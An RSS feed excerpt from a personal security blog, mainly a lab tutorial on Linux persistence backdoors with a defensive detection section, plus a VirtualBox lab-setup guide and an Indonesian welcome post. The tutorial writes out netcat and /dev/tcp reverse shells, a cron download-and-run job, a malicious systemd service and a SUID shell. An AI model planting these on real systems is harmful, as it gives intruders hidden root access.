<li>VMWare - <a href="https://www.vmware.com/products/workstation-player.html">https://www.vmware.com/products/workstation-player.html</a></li>
</ul>
<p>I personally use VirtualBox (Windows) because it&rsquo;s easy to use (and of course, it&rsquo;s free), but I&rsquo;ll update this post if I got another license of VMWare.</p>
<h2 id="02-download-vm-image--ova">02. Download VM image / OVA</h2>
<p>Assuming that you‚Äôve downloaded and installed a VirtualBox, now get your VulnHub machines/VM images at VulnHub‚Äôs official site: <a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210531055642315.png" alt="image-20210531055642315"  /></div>
</p>
<p>For this example, I&rsquo;ll be using <strong>symfonos: 2</strong>.</p>
<h2 id="03-import-the-image">03. Import the image</h2>
<p>For the image, if it&rsquo;s on <code>7z</code> or  <code>zip</code> format make sure to decompress it first. In my case <strong>symfonos: 2</strong> is on <code>7z</code> format, so I have to decompress it.</p>
<p>Here&rsquo;s what I have after decompressing it.</p>
<p><div class="img-container"><img src="imgs/image-20210531060413952.png" alt="image-20210531060413952"  /></div>
</p>
<p>Any <code>.ovf</code> file should already be associated with VirtualBox, and we can just double click on that file. It&rsquo;ll take us straight to the import menu.</p>
<p><div class="img-container"><img src="imgs/image-20210531060734397.png" alt="image-20210531060734397"  /></div>
</p>
<p>To do that manually, open up your VirtualBox then click on the <strong>File</strong> menu -&gt; select &ldquo;Import Appliance&hellip;&rdquo;, it will pop a new window.</p>
<p><div class="img-container"><img src="imgs/image-20210531061142323.png" alt="image-20210531061142323"  /></div>
</p>
<p>Click on the icon that I marked with a red box to browse your VM image.</p>
<p><div class="img-container"><img src="imgs/image-20210531061327937.png" alt="image-20210531061327937"  /></div>
</p>
<p>Locate your VM image and then click on the <strong>Open</strong> button.</p>
<p><div class="img-container"><img src="imgs/image-20210531061601700.png" alt="image-20210531061601700"  /></div>
</p>
<p>For now let&rsquo;s leave all the settings to its default.</p>
<p><div class="img-container"><img src="imgs/image-20210531061941128.png" alt="image-20210531061941128"  /></div>
</p>
<p>Click on the <strong>Import</strong> button and wait until it completed.</p>
<p><div class="img-container"><img src="imgs/image-20210531062110160.png" alt="image-20210531062110160"  /></div>
</p>
<p>When the import is done, you will see the machine on the VM list section</p>
<p><div class="img-container"><img src="imgs/image-20210531062327615.png" alt="image-20210531062327615"  /></div>
</p>
<h2 id="04-setup-vm-network">04. Setup VM network</h2>
<p>Here is the core part, we&rsquo;ll be putting the VM in an isolated network.</p>
<p>Open the VM&rsquo;s settings by right click and choose &ldquo;Settings&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210531062432466.png" alt="image-20210531062432466"  /></div>
</p>
<p>Go to the <strong>Network</strong> section, and set the &ldquo;Attached to&rdquo; to <code>Host-only Adapter</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210531062849952.png" alt="image-20210531062849952"  /></div>
</p>
<p>Click <strong>OK</strong> button.</p>
<p>Now open the adapter configuration on the <strong>File</strong> menu &ndash;&gt; select &ldquo;Host Network Manager&hellip;&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210531065114863.png" alt="image-20210531065114863"  /></div>
</p>
<p>In the image below, the ‚ÄúVirtualBox Host-Only Ethernet Adapter‚Äù will be using a network range of <code>192.168.2.0/24</code> and has DHCP server enabled which is needed by VulnHub machines to obtain IP address automatically on boot.</p>
<p><div class="img-container"><img src="imgs/image-20210531065555859.png" alt="image-20210531065555859"  /></div>
</p>
<p><code>192.168.2.2</code> is the IP address of the virtual adapter on the host side while <code>192.168.2.1</code> is the IP address of the built-in DHCP server from VirtualBox.</p>
<p>Below is the configuration for the DHCP server.</p>
<p><div class="img-container"><img src="imgs/image-20210531065945260.png" alt="image-20210531065945260"  /></div>
</p>
<p>I set my <code>Lower Address Bound</code>  to <code>192.168.2.100</code> and <code>Upper Address Bound</code> to <code>192.168.2.254</code>, so that all machines will be assigned with an IP started from <code>.100-254</code>, and no one gets <code>192.168.2.3-99</code>.</p>
<p><em>Can I configure it to <code>10.10.10.0/24</code>?</em></p>
<p>Yes you can!</p>
<p>If we want to create a <code>10.10.10.0/24</code> network, it&rsquo;s better to create another adapter by clicking the <strong>Create</strong> menu (you don&rsquo;t say) then set the adapter&rsquo;s settings with</p>
<ul>
<li>IPv4 Address: <code>10.10.10.2</code> (Adapter on the host side)</li>
<li>IPv4 Network Mask: <code>255.255.255.0</code></li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210531072801277.png" alt="image-20210531072801277"  /></div>
</p>
<p>Next, configure the DHCP server to:</p>
<ul>
<li>Server Address: <code>10.10.10.1</code> (VirtualBox&rsquo;s built-in DHCP server)</li>
<li>Server Mask: <code>255.255.255.0</code></li>
<li>Lower Address Bound: <code>10.10.10.100</code></li>
<li>Upper Address Bound: <code>10.10.10.254</code></li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210531072833605.png" alt="image-20210531072833605"  /></div>
</p>
<p>Then, on the VM settings (<strong>symfonos: 2</strong>), change the adapter name with the new one we created before</p>
<p><div class="img-container"><img src="imgs/image-20210531072939206.png" alt="image-20210531072939206"  /></div>
</p>
<p>Lastly, we should also configure the attacking machine, in my case it‚Äôs Kali Linux, to use the same network adapter.</p>
<p><div class="img-container"><img src="imgs/image-20210531075306992.png" alt="image-20210531075306992"  /></div>
</p>
<h2 id="05-boot-it">05. Boot it!</h2>
<p>Boot your machines and we&rsquo;re done!</p>
<p><div class="img-container"><img src="imgs/image-20210531075144142.png" alt="image-20210531075144142"  /></div>
</p>
<p>Happy hacking!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Linux Backdoors and Where to Find Them</title>
      <link>https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/</link>
      <pubDate>Tue, 25 May 2021 18:49:35 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/</guid>
      <description>Learn some backdoor techniques and how to deal with them!</description>
      <content:encoded><![CDATA[<p>In Attack-Defense CTF, leaving backdoors is an important part of maintaining access on the target system. As a result, learning some of the backdoor techniques is essential, not only for attackers but also for defenders.</p>
<h2 id="backdoors-what-is-it">Backdoors, what is it?</h2>
<p>What exactly is a backdoor?</p>
<p>Well, I&rsquo;m not going to go into as much detail as <a href="https://en.wikipedia.org/wiki/Backdoor_(computing)">Wikipedia</a>, but here&rsquo;s:</p>
<p>A backdoor is a hidden piece of code, script, or a program that is placed on a system for persistence purposes, with that you don‚Äôt have to exploit the same system twice. It simply gives you quicker and instant access to the system.</p>
<p>Now that we know what a backdoor is, it‚Äôs time to find out where attackers typically hide them in a <strong>Linux</strong> system. I‚Äôll be using the <a href="https://www.vulnhub.com/entry/pinkys-palace-v1,225/">Pinky‚Äôs Palace</a> machine from VulnHub and let‚Äôs pretend it has been compromised by attackers.</p>
<h3 id="1-ssh-keys">1. SSH keys</h3>
<p>When the attackers insert their public keys into one of the user&rsquo;s or root&rsquo;s <code>authorized_keys</code> file, it can be considered as a backdoor.</p>
<p>For example, below are the exploitation steps to gain root access on the target system (Pinky&rsquo;s Palace).</p>
<p><div class="img-container"><img src="imgs/image-20210526004056632.png" alt="image-20210526004056632"  /></div>
</p>
<p>Of course, as an attacker, I don‚Äôt want to repeat all those exploitation steps all over again.</p>
<p>So instead, on my attacking machine, I‚Äôll generate a new pair of <a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">SSH keys</a> specialized for backdoor.</p>
<p><div class="img-container"><img src="imgs/image-20210526004747293.png" alt="image-20210526004747293"  /></div>
</p>
<p>And then, I can insert the newly generated public key (<code>backdoor_ssh.pub</code>) into the root‚Äôs or user‚Äôs  <code>authorized_keys</code> file of the compromised system.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILaxTiK3WJJ422K1yf/9yXFWBeWV6mpZxMEualO2uIul root@kali&#39; &gt; /root/.ssh/authorized_keys
</code></pre></div><p>Now by specifying <code>backdoor_ssh</code> as the identity file (private key), I‚Äôm able to gain access on the compromised system via SSH instantly.</p>
<p><div class="img-container"><img src="imgs/image-20210526005156382.png" alt="image-20210526005156382"  /></div>
</p>
<h3 id="2-ssh-motd">2. SSH motd</h3>
<p>This is one of the cool tricks I&rsquo;ve learned from HackTheBox machine called Traceback.</p>
<p>Motd (Message of the day) is the banner that appears when you log into the machine using SSH. For Ubuntu/Debian motd can be found at <code>/etc/update-motd.d</code>.</p>
<p>By default, other users don&rsquo;t have write permission on that directory.</p>
<p><div class="img-container"><img src="imgs/image-20210526010220513.png" alt="image-20210526010220513"  /></div>
</p>
<p>From the image above, there is only one motd script called <code>10-uname</code>.</p>
<p>As an attacker, I could place a new script there as a backdoor. For example, I&rsquo;ll put a netcat reverse shell script and name it as <code>20-backdoor</code> inside <code>/etc/update-motd.d/</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/update-motd.d# echo -e &#39;#!/bin/sh\nnc 192.168.2.103 9001 -e /bin/bash &amp;&#39; &gt; 20-backdoor &amp;&amp; chmod +x 20-backdoor
</code></pre></div><p>Then I&rsquo;ll login into the machine using a low privilege account named pinky.</p>
<p><div class="img-container"><img src="imgs/image-20210526010934360.png" alt="image-20210526010934360"  /></div>
</p>
<p>As you can see, that SSH login triggers my backdoor.</p>
<p>But wait, I logged in using pinky. How did I end up with a root shell?</p>
<p>Here is the <a href="http://manpages.ubuntu.com/manpages/xenial/en/man5/update-motd.5.htm">answer</a>:</p>
<blockquote>
<p>&hellip;</p>
<p>‚Äã       Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at
‚Äã       each  login,  and  this information is concatenated in /var/run/motd.  The order of script
‚Äã       execution is determined by the run-parts(8) &ndash;lsbsysinit  option  (basically  alphabetical
‚Äã       order, with a few caveats).</p>
<p>&hellip;</p>
</blockquote>
<h3 id="3-users-bashrc---interactive-session">3. User&rsquo;s .bashrc - Interactive session</h3>
<p><code>.bashrc</code> is one of the startup scripts used by Bourne shell aka <code>bash</code>. If there is a user who uses <code>bash</code> as their login shell, then this <code>.bashrc</code> will be executed for each interactive session they launch.</p>
<p>Here is some actions that triggers an interactive session:</p>
<p><div class="img-container"><img src="imgs/image-20210526005325944.png" alt="image-20210526005325944"  /></div>
</p>
<p>At the image above, I inserted a non malicious line script <code>echo &quot;I'm triggered&quot;</code> to my <code>.bashrc</code>. But now, as an attacker, I can put a <a href="https://www.techslang.com/definition/what-is-a-reverse-shell/">reverse shell</a> there, and then I&rsquo;ll just wait for someone to log in to trigger it.</p>
<pre><code>pinky@pinkys-palace:~$ echo 'nc 192.168.2.103 9001 -e /bin/bash &gt;/dev/null &amp;' &gt; .bashrc
</code></pre><p><div class="img-container"><img src="imgs/image-20210525220025256.png" alt="image-20210525220025256"  /></div>
</p>
<p>In the image above, I switched from <code>root</code> to user <code>pinky</code> and put a reverse shell on pinky&rsquo;s <code>.bashrc</code> file. I exited pinky&rsquo;s shell and immediately switch again to user <code>pinky</code> to trigger an interactive session.</p>
<h3 id="4-users-bashrc---aliases">4. User&rsquo;s .bashrc - Aliases</h3>
<p>As an attacker, I can also put the backdoor in the users' aliases!</p>
<p>Here is the example of a backdoored <code>cd</code>.</p>
<pre><code>root@pinkys-palace:~# alias cdalias cd='$(nc 192.168.2.103 9001 -e /bin/bash&amp;); cd'
</code></pre><p><div class="img-container"><img src="imgs/image-20210526002305189.png" alt="image-20210526002305189"  /></div>
</p>
<p>Some other tricky backdoor using alias:</p>
<ul>
<li><a href="https://github.com/nisay759/sudo-backdoor">https://github.com/nisay759/sudo-backdoor</a></li>
<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
</ul>
<h3 id="5-cron-jobs">5. Cron jobs</h3>
<p>Cron is a feature from Linux/UNIX-like OS that can be used to periodically perform a specific job or task just like Task Scheduler in Windows.</p>
<p>Here is the example of a backdoor using Cron job.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:~# echo &#39;* * * * * root cd /tmp; wget 192.168.2.113/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor; rm /etc/cron.d/backdoor&#39; &gt; /etc/cron.d/backdoor
</code></pre></div><p>What the task above does is it will download an executable binary called &lsquo;backdoor&rsquo; that is hosted on my attacking machine, and the backdoor is then executed once every minute.</p>
<p><div class="img-container"><img src="imgs/image-20210525222500077.png" alt="image-20210525222500077"  /></div>
</p>
<h3 id="6-backdoor-as-a-service-baas">6. Backdoor as a Service (BaaS)</h3>
<p>An attacker can also create a backdoor as a service (BaaS) *I&rsquo;m joking, but it&rsquo;s true.</p>
<p>Here is the example of BaaS typed directly in a terminal:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/systemd/system# echo &#39;
&gt; [Service]
&gt; Type=simple
&gt; User=root
&gt; ExecStart=/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.2.103/9001 0&gt;&amp;1&#34;
&gt; [Install]
&gt; WantedBy=multi-user.target&#39;
&gt; &#39; &gt; backdoor.service
</code></pre></div><p>In a single file (<code>backdoor.service</code>):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[Service]
Type=simple
User=root
ExecStart=/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.2.103/9001 0&gt;&amp;1&#34;
[Install]
WantedBy=multi-user.target&#39;
</code></pre></div><p>When the service is started, it launches a reverse shell to the attacker.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/systemd/system# systemctl start backdoor.service
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526013637397.png" alt="image-20210526013637397"  /></div>
</p>
<p>It can be enabled on boot too.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/systemd/system# systemctl enable backdoor.service
</code></pre></div><h3 id="7-suid">7. SUID</h3>
<p>The last one on this post is SUID.</p>
<p>As an example, I can make a copy of bash called <code>.backdoor</code> (notice the dot) to a low privilege user but has been compromised,  and then set SUID permission on it.</p>
<p><div class="img-container"><img src="imgs/image-20210526020936681.png" alt="image-20210526020936681"  /></div>
</p>
<p>Why do I add dot?</p>
<p>Well, this is based on my observation on some people out there. They tend to just use <code>ls -l</code> rather than <code>ls -la</code>, and this becomes an advantage for attackers to put a backdoor with a dot.</p>
<p>It‚Äôs not just about SUID though, it applies to other backdoors as well (*<em>cough</em>* and <code>.git</code> folder *<em>cough</em>*)</p>
<h2 id="blue-team-side">Blue Team side</h2>
<p>Before reading further, I‚Äôll state that if your server (irl) gets hacked, it‚Äôs better to restore the server‚Äôs backup or completely rebuild it from scratch, because in the real world, those backdoors can be obfuscated and combined with other techniques (not to mention there might be a rootkit too), which makes it difficult to detect/find.</p>
<p>Also what I share here might not be that effective but, but here is how I usually deal with those backdoors in attack-defense CTF.</p>
<h3 id="ssh-keys-and-bashrc">SSH keys and .bashrc.</h3>
<p>Make sure to regularly check the all the users <code>authorized_keys</code> file.</p>
<p>In the image below, there is a public key with a foreign hostname <code>kali</code> instead of <code>pinkys-palace</code>, then you should suspect it.</p>
<p><div class="img-container"><img src="imgs/image-20210605091730851.png" alt="image-20210605091730851"  /></div>
</p>
<p>Well, actually, the attackers might have tricked it to look like it was a legitimate one.</p>
<p>My workaround here is why don‚Äôt we create a ‚Äòskeleton‚Äô file of all the <code>authorized_keys</code> files and set a Cronjob which automatically reverts those files back to its original state, and I might perform it remotely via <code>scp</code>. This can be applied as well to handle backdoor in <code>.bashrc</code> .</p>
<blockquote>
<p>You can find the skeleton file of <code>.bashrc</code> at <code>/etc/skel</code>.</p>
</blockquote>
<h3 id="ssh-motd">SSH motd</h3>
<p>It&rsquo;s not always placed on <code>/etc/update-motd.d</code> but make sure the <strong>motd</strong> directory is only writable by root, note the default list of <strong>motd</strong> files and apply the same thing as above (skeleton file) because attackers might have inserted backdoor in the original file.</p>
<p>We could also do some &lsquo;forensics&rsquo; using timestamp:</p>
<pre><code>root@MSI:/etc/update-motd.d# ls --full-time
</code></pre><p>For example, those files with the timestamp <code>000000000</code> (nano) in the image below have most likely not been modified and are still in their original state.</p>
<p><div class="img-container"><img src="imgs/image-20210605092751344.png" alt="image-20210605092751344"  /></div>
</p>
<p>After inserting a non-malicious line, the timestamp changed. From here, it&rsquo;s safe to assume that someone/something has modified it.</p>
<p><div class="img-container"><img src="imgs/image-20210605093121574.png" alt="image-20210605093121574"  /></div>
</p>
<h3 id="cronjobs-and-services">Cronjobs and Services</h3>
<p>I think monitoring the process using  <code>netstat</code> and <code>ps</code> command is enough for this. Anything that looks like a reverse shell or a bind shell is definitely suspicious.</p>
<p>To find an unwanted open port we can use this command:</p>
<pre><code>netstat -antp | grep LISTEN
</code></pre><p>To find a suspicious  connection we can use this command:</p>
<pre><code>netstat -antp | grep ESTABLISHED
</code></pre><p><div class="img-container"><img src="imgs/image-20210526034616621.png" alt="image-20210526034616621"  /></div>
</p>
<p>Sometimes the state of a backdoor is neither ESTABLISHED nor LISTEN but SYN_SENT. That happens because the backdoor tries to send a reverse shell out but the attacker didn‚Äôt catch or fail to catch it.</p>
<p>To find that, at the <code>grep</code> side, we can just change ESTABLISHED or LISTEN to SYN_SENT</p>
<pre><code>netstat -antp | grep SYN_SENT
</code></pre><p>There is also the <code>ps -f</code> command which is pretty good at visualizing the process tree. For example, here we know that the culprit that keeps opening the HTTPS port (443) is probably on <code>.bashrc</code> file because it gets triggered every time we launch a bash shell (interactive session).</p>
<p><div class="img-container"><img src="imgs/image-20210526034217561.png" alt="image-20210526034217561"  /></div>
</p>
<h3 id="finding-suid">Finding SUID</h3>
<p>To find some suspicious SUID we can use the <code>find</code> commands. It can also detect the SUID that started with dot!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/update-motd.d# find / -type f -perm 4755 2&gt;/dev/null
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526035623660.png" alt="image-20210526035623660"  /></div>
</p>
<p>So that&rsquo;s all for today.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.techslang.com/definition/what-is-a-reverse-shell/">https://www.techslang.com/definition/what-is-a-reverse-shell/</a></li>
<li><a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54</a></li>
<li><a href="https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/">https://blog.g0tmi1k.com/2011/08/kioptrix-level-3/</a></li>
<li><a href="https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c">https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c</a></li>
<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
<li><a href="https://ippsec.rocks/?#">https://ippsec.rocks/?#</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>EHLO world</title>
      <link>https://fahmifj.github.io/blog/hello-world/</link>
      <pubDate>Sat, 27 Mar 2021 22:36:47 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/hello-world/</guid>
      <description>Halo, selamat datang di post pertama blog ini!
Saya Fahmi, empunya blog :D
Sedikit cerita, blog ini adalah blog yang ke-4 (5 sih kalau Tumblr dihitung üòÖ) tapi blog yang pertama pakai static-site generator.
Setelah vakum lama dari blogging, diakhir tahun 2019 baru mulai lagi pakai Medium dan dari nol. Blog yang lama terlanjur bala dengan tugas kampus soalnya. Terlebih kalau pake blogger kaya balik lagi ke 2012, jadi tak arsipkan itu blog.</description>
      <content:encoded><![CDATA[<p>Halo, selamat datang di post pertama blog ini!</p>
<p>Saya Fahmi, empunya blog :D</p>
<p>Sedikit cerita, blog ini adalah blog yang ke-4 (5 sih kalau Tumblr dihitung üòÖ) tapi blog yang pertama pakai <em>static-site generator</em>.</p>
<p>Setelah vakum lama dari blogging, diakhir tahun 2019 baru mulai lagi pakai Medium dan dari nol. Blog yang lama terlanjur <em>bala</em> dengan tugas kampus soalnya. Terlebih kalau pake blogger kaya balik lagi ke 2012, jadi tak arsipkan itu blog.</p>
<p>Udah satu tahun lebih nulis di <a href="https://fahmifj.medium.com/">Medium</a>, ternyata jenuh juga sama <em>minimalist</em>-nya Medium. <em>Formatting</em>-nya terbatas apalagi untuk <em>paste-paste</em> kode, dan terakhir kampret momennya itu sering <em>error</em> pas akhir-akhir mau di &ldquo;Publish&rdquo;. Jadi dibuatlah blog ini, walau tadinya sih iseng coba-coba pakai <em>static-site generator</em> tapi ternyata enak dan gampang di-<em>manage</em>-nya.</p>
<p>Isi blognya?</p>
<p>Untuk saat ini isinya baru coretan-coretan kaya gini dan mindahin <em>write-up</em> HackTheBox dari Medium yang juga dipoles ulang biar lebih jelas alurnya. Mungkin ditambah sama write-up dari TryHackMe sampai VulnHub yang fokusnya ke boot2root terutama mesin-mesin yang ada di list <a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#">OSCP-likenya TJNull</a> sih. Yah, pokoknya <em>gak</em> jauh-jauh dari IT deh.</p>
<p>Wah panjang juga ya &ndash;&quot;, mungkin <em>stop</em> sampai sini dulu~</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
